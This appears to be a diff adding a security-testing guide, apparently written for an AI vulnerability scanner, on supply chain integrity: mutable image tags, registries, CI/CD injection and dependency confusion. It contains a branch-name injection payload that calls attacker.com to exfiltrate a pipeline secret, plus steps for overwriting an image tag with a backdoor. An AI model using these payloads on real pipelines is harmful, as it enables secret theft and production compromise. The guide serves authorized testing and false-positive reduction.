@@ -1,0 +1,381 @@
+<supply_chain_integrity_guide>
+<title>SUPPLY CHAIN AND ARTIFACT INTEGRITY</title>
+
+<critical>Supply chain vulnerabilities allow attackers to inject malicious code into build pipelines, container images, and software artifacts. Compromising the software supply chain provides persistent access that survives application updates and affects all downstream deployments. These attacks are high-impact and often difficult to detect.</critical>
+
+<scope>
+- Container image integrity: Unsigned images, mutable tags, registry poisoning
+- Build pipeline security: CI/CD compromise, build injection, artifact tampering
+- Dependency security: Malicious packages, typosquatting, dependency confusion
+- Code signing: Missing signatures, weak verification, key exposure
+- Registry security: Public registries, credential exposure, pull-through caches
+- Infrastructure as Code: Unsigned modules, mutable sources, remote state tampering
+- Binary artifacts: Unsigned releases, checksum bypass, distribution compromise
+</scope>
+
+<methodology>
+1. Map the software supply chain: Source, build, registry, deployment.
+2. Identify unsigned or unverified artifacts at each stage.
+3. Check for mutable references (tags vs digests, branches vs commits).
+4. Test registry access controls and authentication.
+5. Analyze CI/CD pipeline for injection points.
+6. Verify signature validation is enforced.
+7. Document exploitable weaknesses with attack scenarios.
+</methodology>
+
+<discovery_techniques>
+<identify_supply_chain>
+Key components to analyze:
+- Source control: Git repositories, branch protections
+- Build system: Jenkins, GitHub Actions, GitLab CI, CircleCI
+- Artifact storage: Container registries, package repositories
+- Deployment: Kubernetes, ECS, Lambda
+- Dependencies: npm, pip, Maven, NuGet
+
+Signs of supply chain weaknesses:
+- Images referenced by tag not digest: `image:latest` vs `image@sha256:...`
+- No cosign/sigstore signatures on images
+- Public base images without verification
+- CI/CD variables with secrets in plain text
+- No SBOM (Software Bill of Materials)
+</identify_supply_chain>
+
+<container_image_analysis>
+Check container image references:
+```bash
+# Find mutable tags in Kubernetes manifests
+grep -r "image:" k8s/ | grep -v "@sha256"
+
+# Check Dockerfile FROM statements
+grep "FROM" */Dockerfile | grep -v "@sha256"
+
+# Verify image signatures
+cosign verify gcr.io/project/image:tag
+
+# Check for latest tag usage
+grep -r ":latest" . --include="*.yaml" --include="*.yml"
+```
+
+Vulnerable patterns:
+- `FROM ubuntu:latest` - Mutable, unverified
+- `image: myapp:v1.0` - Mutable tag, no digest
+- `image: public.ecr.aws/image:tag` - Public, unsigned
+</container_image_analysis>
+
+<registry_security>
+Test registry access:
+```bash
+# Anonymous pull test
+docker pull registry.example.com/image:tag
+
+# Check registry API
+curl https://registry.example.com/v2/_catalog
+curl https://registry.example.com/v2/image/tags/list
+
+# Test push permissions (only in authorized scope)
+docker push registry.example.com/test:probe
+```
+
+Misconfigurations:
+- Anonymous read access to private images
+- Write access without authentication
+- No content trust/signature requirement
+- Missing vulnerability scanning
+</registry_security>
+
+<cicd_pipeline_analysis>
+Review pipeline configurations:
+```yaml
+# GitHub Actions - check for injection points
+- run: echo ${{ github.event.issue.title }}  # Injection risk
+
+# Check for secrets in logs
+- run: echo $SECRET_KEY  # May expose in logs
+
+# Verify pinned actions
+uses: actions/checkout@v3  # Mutable
+uses: actions/checkout@a5ac7e5...  # Pinned to commit
+```
+
+Pipeline vulnerabilities:
+- Script injection via PR titles, branch names
+- Secrets exposed in build logs
+- Actions/plugins from untrusted sources
+- Build environment shared between projects
+- Artifact storage without integrity checks
+</cicd_pipeline_analysis>
+
+<dependency_analysis>
+Check dependency sources:
+```bash
+# npm - check for private package names in public registry
+npm view internal-package-name
+
+# pip - check index configuration
+pip config list | grep index
+
+# Maven - verify repository configuration
+cat pom.xml | grep repository
+
+# Go - check module sources
+cat go.mod | grep replace
+```
+
+Dependency confusion indicators:
+- Private package names that could exist publicly
+- No registry scoping (@org/package)
+- Mixed public/private repository configuration
+- Loose version constraints (>= vs ==)
+</dependency_analysis>
+</discovery_techniques>
+
+<vulnerability_types>
+<mutable_image_tags>
+Risk: Attacker replaces image contents while keeping same tag
+Attack:
+1. Compromise registry credentials or use public registry
+2. Push malicious image with same tag (e.g., v1.0, latest)
+3. Wait for victim to pull/redeploy
+4. Malicious code executes in victim's environment
+
+Prevention: Use immutable digests (image@sha256:abc123)
+</mutable_image_tags>
+
+<unsigned_artifacts>
+Risk: No verification that artifacts came from legitimate source
+Attack:
+1. MITM during artifact download
+2. Compromise distribution channel
+3. Registry poisoning
+4. Substitute malicious artifact
+
+Prevention: Sign artifacts with cosign/sigstore, verify on deployment
+</unsigned_artifacts>
+
+<dependency_confusion>
+Risk: Private package name registered on public registry
+Attack:
+1. Identify private package name (from error messages, docs, code)
+2. Register same name on public npm/pip
+3. Publish malicious version with higher version number
+4. Victim's build pulls public malicious package
+
+Prevention: Scoped packages (@org/), pinned versions, registry configuration
+</dependency_confusion>
+
+<cicd_injection>
+Risk: Attacker-controlled input executed in build pipeline
+Attack:
+1. Create PR with malicious branch name or commit message
+2. Pipeline interpolates name into shell command
+3. Code executes in CI/CD environment with elevated access
+4. Steal secrets, modify artifacts, pivot to production
+
+Prevention: Sanitize inputs, use intermediate environment variables
+</cicd_injection>
+
+<base_image_poisoning>
+Risk: Malicious base image affects all derived images
+Attack:
+1. Compromise popular public base image (or create typosquatted one)
+2. Inject backdoor/malware into base
+3. All images built FROM this base are compromised
+4. Widespread impact across organizations
+
+Prevention: Verify base images, use digests, scan for vulnerabilities
+</base_image_poisoning>
+</vulnerability_types>
+
+<exploitation>
+<tag_mutability_exploit>
+Proof of concept:
+1. Identify image referenced by mutable tag: `myregistry/app:v1.0`
+2. If registry allows push (or you compromise credentials):
+   ```bash
+   docker pull myregistry/app:v1.0
+   # Modify image to add backdoor
+   docker build -t myregistry/app:v1.0 .
+   docker push myregistry/app:v1.0
+   ```
+3. Wait for deployment to pull image
+4. Backdoor executes in production
+
+Evidence:
+- Show image reference uses tag not digest
+- Demonstrate tag can be overwritten (in authorized testing)
+- Document impact: RCE in all deployments using this image
+</tag_mutability_exploit>
+
+<cicd_injection_exploit>
+Proof of concept:
+1. Find pipeline that uses PR metadata:
+   ```yaml
+   - run: echo "Building ${{ github.head_ref }}"
+   ```
+2. Create branch with injection payload:
+   ```
+   branch name: test"; curl http://attacker.com/steal?secret=$SECRET; echo "
+   ```
+3. Open PR, observe pipeline execution
+4. Secret exfiltrated to attacker server
+
+Evidence:
+- Pipeline configuration showing injection point
+- Callback received with sensitive data
+- Document impacted secrets/access
+</cicd_injection_exploit>
+
+<dependency_confusion_exploit>
+Proof of concept:
+1. Identify internal package name (from error, docs, or code)
+2. Check if name exists on public registry:
+   ```bash
+   npm view internal-auth-lib
+   # If 404, name is available
+   ```
+3. Register package on public registry
+4. Publish benign canary version (for authorized testing)
+5. Monitor if victim builds pull from public registry
+
+Evidence:
+- Internal package name identified
+- Name available on public registry
+- Build configuration pulls from public by default
+</dependency_confusion_exploit>
+</exploitation>
+
+<validation>
+1. Demonstrate actual exploitability, not just missing best practice.
+2. For tag mutability: Show image referenced by tag AND can be modified.
+3. For unsigned images: Show signature is not required for deployment.
+4. For CI/CD injection: Prove code execution in pipeline.
+5. For dependency confusion: Show build pulls from public registry.
+6. Document the complete attack chain from initial access to impact.
+7. Verify in production-equivalent environment, not just development.
+</validation>
+
+<false_positives>
+- Mutable tags in development/test only (production uses digests)
+- Missing signatures when deployment doesn't require them
+- Public images that are intentionally public and verified
+- CI/CD with proper input sanitization
+- Dependency confusion not possible (scoped packages, registry config)
+- Internal-only registries with network controls
+</false_positives>
+
+<llm_reasoning_errors>
+COMMON AI MISTAKES THAT CAUSE FALSE POSITIVES - AVOID THESE:
+
+1. MUTABLE TAG WITHOUT EXPLOITATION:
+   WRONG: "image:latest used in Kubernetes manifest, supply chain vulnerability"
+   RIGHT: Mutable tags are a risk but require exploitation context:
+          - Registry must allow unauthorized writes, OR
+          - Attacker must be able to compromise registry creds
+          - If registry is private with proper auth, risk is limited
+          Show HOW attacker would replace the image.
+
+2. MISSING SIGNATURE VS REQUIRED SIGNATURE:
+   WRONG: "Container image not signed with cosign, unsigned artifact vulnerability"
+   RIGHT: Missing signatures are only vulnerability if:
+          - Deployment SHOULD require signatures (policy exists)
+          - Or there's no other integrity verification
+          - Many environments don't use signing yet
+          Check if signature verification is expected/required.
+
+3. PUBLIC BASE IMAGE CONCERN:
+   WRONG: "Dockerfile uses ubuntu:22.04 from Docker Hub, untrusted base image"
+   RIGHT: Official images from Docker Hub are generally trusted:
+          - Official images are verified by Docker
+          - Many organizations accept Docker Official Images
+          - Risk is typosquatting or unofficial images
+          Focus on unofficial or suspicious base images.
+
+4. THEORETICAL DEPENDENCY CONFUSION:
+   WRONG: "Internal package name could be registered publicly"
+   RIGHT: Dependency confusion requires:
+          - Package name NOT already registered publicly
+          - Build system pulls from public by default
+          - No registry scoping/configuration preventing this
+          Verify the attack is actually possible.
+
+5. CI/CD INPUT WITHOUT INJECTION:
+   WRONG: "GitHub Action uses github.event, injection possible"
+   RIGHT: Not all event properties are injectable:
+          - Must be user-controlled (PR title, branch name, body)
+          - Must be interpolated into shell (not just referenced)
+          - May have sanitization in place
+          Prove actual injection, not just usage of event data.
+
+6. DEVELOPMENT VS PRODUCTION:
+   WRONG: "Staging uses unsigned images, supply chain risk"
+   RIGHT: Development environments often have relaxed controls:
+          - Intentionally easier deployment for testing
+          - Production may have different requirements
+          - Finding must apply to production artifacts
+          Verify finding affects production supply chain.
+</llm_reasoning_errors>
+
+<expanded_false_positives>
+FALSE POSITIVE SCENARIOS - DO NOT REPORT:
+
+1. ACCEPTABLE TAG USAGE:
+   - Development/test environments with mutable tags
+   - Tags with digest pinning in deployment tooling
+   - GitOps with image digest extraction (Flux, ArgoCD)
+   - Short-lived environments rebuilt frequently
+
+2. APPROPRIATE TRUST MODELS:
+   - Docker Official Images without additional verification
+   - Verified publisher images on Docker Hub
+   - Organization's own verified registries
+   - Images with vulnerability scanning but no signing
+
+3. PROTECTED CI/CD:
+   - Input sanitization present
+   - Intermediate variables preventing injection
+   - Restricted GITHUB_TOKEN permissions
+   - Environment separation (PRs can't access production)
+
+4. DEPENDENCY MANAGEMENT:
+   - Scoped packages (@org/package-name)
+   - Private registry configured as sole source
+   - Lock files with integrity hashes
+   - Vendored dependencies
+
+5. NETWORK CONTROLS:
+   - Private registries only accessible from internal network
+   - Pull-through caches with origin verification
+   - Egress restrictions preventing public pulls
+
+6. EXISTING MITIGATIONS:
+   - Runtime security (Falco, etc.) detecting anomalies
+   - Image allowlisting in admission controllers
+   - SBOM and provenance attestation
+</expanded_false_positives>
+
+<impact>
+- Remote code execution: Malicious code runs in production workloads
+- Persistent access: Compromise survives application updates
+- Mass compromise: Single poisoned artifact affects all deployments
+- Data breach: Access to production secrets and data
+- Credential theft: CI/CD secrets exfiltrated
+- Lateral movement: Pivot from build system to production
+- Reputation damage: Distributing malware to customers
+- Compliance violation: Failed supply chain integrity controls
+</impact>
+
+<pro_tips>
+1. Check both Kubernetes manifests AND Helm charts/Kustomize for image references.
+2. GitHub Actions `${{ }}` syntax is particularly prone to injection - review all uses.
+3. Dependency confusion is most common in npm and pip - check registry configurations.
+4. Look for service account keys and registry credentials in CI/CD logs.
+5. Base image age matters - very old images likely have vulnerabilities.
+6. Check if admission controllers like OPA Gatekeeper enforce image policies.
+7. SBOM (Software Bill of Materials) absence is informational, not always vulnerability.
+8. cosign verify requires the public key - check if verification is possible.
+9. GitOps tools may extract digests from tags, providing implicit pinning.
+10. Look for build cache poisoning - shared caches between untrusted builds.
+</pro_tips>
+
+<remember>Supply chain vulnerabilities require demonstrating actual exploitation paths, not just missing best practices. Mutable tags need registry write access, dependency confusion needs actual name availability, and CI/CD injection needs verified code execution. Focus on production impact and complete attack chains.</remember>
+</supply_chain_integrity_guide>
